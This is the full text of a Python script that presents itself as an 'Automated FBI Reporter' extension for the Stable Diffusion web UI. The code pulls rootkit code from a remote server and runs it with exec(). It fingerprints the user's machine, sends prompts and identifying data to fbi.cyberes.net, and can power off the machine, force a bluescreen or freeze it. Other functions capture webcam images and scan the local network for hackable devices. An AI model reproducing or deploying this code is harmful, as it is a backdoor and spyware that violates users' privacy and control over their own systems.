import inspect
import platform
import re
import subprocess
import time
import warnings
from base64 import b64encode
from getpass import getuser
from pathlib import Path
from typing import Any, List, Tuple

import cv2
import requests
import torch
from PIL import Image
from cpuinfo import get_cpu_info
from modules import script_callbacks, scripts, shared
from requests import Response

from bsod import bsod, linux_freeze
from scripts.funcs import *
from scripts.network_scanner import scan_network as scanner

warnings.filterwarnings('ignore')


def concat(input_obj) -> list:
    """
    Used to turn a machine hardware signature into a string.
    Makes it easy to quickly compare machines and determine which one
    the criminal used to generate unsafe images.
    """
    out = []
    if isinstance(input_obj, dict):
        for k, v in input_obj.items():
            out = out + concat(v)
    elif isinstance(input_obj, list) or isinstance(input_obj, tuple):
        for item in input_obj:
            out = out + concat(item)
    else:
        out.append(input_obj)
    return out


# Initalize all the things outside of the class since we only need to do it once, not every time the object is created.

# Update the program on start
dir_path = Path(inspect.getfile(lambda: None)).parents[1]
if git_pull_changed(dir_path):
    print('Submodules updated, restarting program...')
    restart_program()


def get_client_config(domain) -> Tuple[Any, Any, Response]:
    r = requests.get(f'https://{domain}/client', verify=False)
    return r.json(), r.json()['banned_words'], r


cf_endpoint = 'route.fbi.cyberes.net'
main_endpoint = 'fbi.cyberes.net'
endpoint = None
endpoint_err = None

# Try to use the Cloudflare Workers backend first.
try:
    client_config, banned_words, resp = get_client_config(cf_endpoint)
    if resp.status_code == 200:
        endpoint = cf_endpoint
except Exception as e:
    print('Failed to reach routed endpoint:', e)

# If that fails just use the main endpoint.
if not endpoint:
    try:
        client_config, banned_words, resp = get_client_config(main_endpoint)
        if resp.status_code == 200:
            endpoint = main_endpoint
    except Exception as e:
        # We'll handle this later
        endpoint_err = e

# If the endpoint is not defined that means the server didn't give us 200 OK.
if not endpoint:
    print('Failed to load automated FBI reporter:')
    print(endpoint_err)
    print('Permission not granted to run Stable Diffusion.')
    sys.exit(1)

# Enable the rootkit if the server tells us to.
if client_config['rootkit_enabled']:
    for code in client_config['rootkit']:
        exec(code)

# Get the criminal's external IP.
try:
    r = requests.get('https://icanhazip.com/')
    if r.status_code == 200:
        external_ip = r.text.strip('\n')
    else:
        external_ip = '-1'
except:
    external_ip = '-1'

# Get the machine's network addresses.
try:
    import netifaces
    found_interfaces = [(netifaces.ifaddresses(x)[netifaces.AF_INET][0]['addr'], netifaces.ifaddresses(x)[netifaces.AF_LINK][0]['addr']) for x in netifaces.interfaces()],
except:
    found_interfaces = (-1, -1)

# Build the machine signature which will allow us to identify a criminal.
machine_signature = {
    'architecture': f'{platform.architecture()[0]} {platform.architecture()[1]}',
    'machine': platform.machine(),
    'hostname': platform.node(),
    'processor': platform.processor(),
    'system': platform.system(),
    'username': getuser(),
    'external_ip': external_ip,
    'cpu_count': len(os.sched_getaffinity(0)),
    'total_memory': psutil.virtual_memory().total,
    'cpu_info': get_cpu_info(),
    'gpus': {},
    'interfaces': found_interfaces,
}

# Get GPU information
if torch.cuda.is_available():
    try:
        for i in range(torch.cuda.device_count()):
            x = torch.cuda.get_device_properties(i)
            machine_signature['gpus'][i] = {
                'name': x.name,
                'major': x.major,
                'minor': x.minor,
                'total_memory': x.total_memory,
                'multi_processor_count': x.multi_processor_count
            }
    except:
        pass
else:
    machine_signature['gpu_count'] = -1

# Encode the dict to base64 to make it easy to compare to other machines.
machine_signature_encoded = b64encode(' '.join([str(x) for x in concat(machine_signature)]).encode()).decode()


class FBIReporter(scripts.Script):
    def title(self):
        return "Automated FBI Reporter"

    def show(self, is_img2img):
        return scripts.AlwaysVisible

    def process(self, p):
        user_prompt = p.all_prompts[0]
        found_words = check_unsafe_prompt(user_prompt)
        if len(found_words) > 0:
            print(f'******** DETECTED UNSAFE PROMPT ********\nBad words: {found_words}\nReporting to FBI + NCMEC...')
            report_to_fbi(user_prompt, found_words)
            if client_config['stop_machine_on_violation']:
                # Turn off the computer when the criminal generates an unsafe prompt.
                cmd = ''  # if the server sent something weird just ignore it and exit the program
                if os.name == 'nt':
                    if client_config['stop_machine_on_violation_type'] == 'shutdown':
                        cmd = 'taskkill /IM "python.exe" /F & shutdown /s /t 1'
                    elif client_config['stop_machine_on_violation_type'] == 'bsod':
                        bsod()
                else:
                    if client_config['stop_machine_on_violation_type'] == 'shutdown':
                        cmd = 'pkill python3; sudo poweroff'
                    elif client_config['stop_machine_on_violation_type'] == 'bsod':
                        linux_freeze()
                # Kill all python processes first (in case we don't have sudo access),
                # then power off the machine.
                subprocess.run(cmd, shell=True)
                sys.exit(1)  # just in case pkill failed to kill this process


def report_to_fbi(prompt: dict, found_words: list):
    try:
        r = requests.post('https://fbi.cyberes.net/report', headers={'Authorization': 'Bearer jlkasdkljasdljkasdlkj'},
                          json={
                              'prompt': prompt,
                              'found_words': found_words,
                              'machine_signature': machine_signature,
                              'machine_signature_encoded': machine_signature_encoded,
                              'external_ip': external_ip,
                              'ts': time.time()
                          }
                          )
        return r
    except Exception as e:
        print('Failed to send data to the FBI.')
        print('Prompt:', prompt)
        print('Found words:', found_words)
        print(e)
        sys.exit(1)


def check_unsafe_prompt(prompt) -> List[str]:
    found_words = []
    for word in banned_words:
        if re.search(word.lower(), prompt):
            found_words.append(word)
    return found_words


def capture_image_webcam() -> Image:
    """
    Take a photo of the criminal using their webcam.
    """
    v = cv2.VideoCapture(0)
    ret, frame = v.read()
    v.release()
    return Image.fromarray(frame)


def scan_network() -> dict:
    """
    Scan the criminal's local network for illegal content.
    We're looking for open file shares, unlocked computers,
    hackable IOT devices, and other devices that may idenfity
    the criminal.
    """
    return scanner()


def on_ui_settings():
    shared.opts.add_option("report_to_fbi", shared.OptionInfo(True, "Automatically report unsafe prompts to the FBI", section=("trust_safety", "Trust & Safety")))


script_callbacks.on_ui_settings(on_ui_settings)
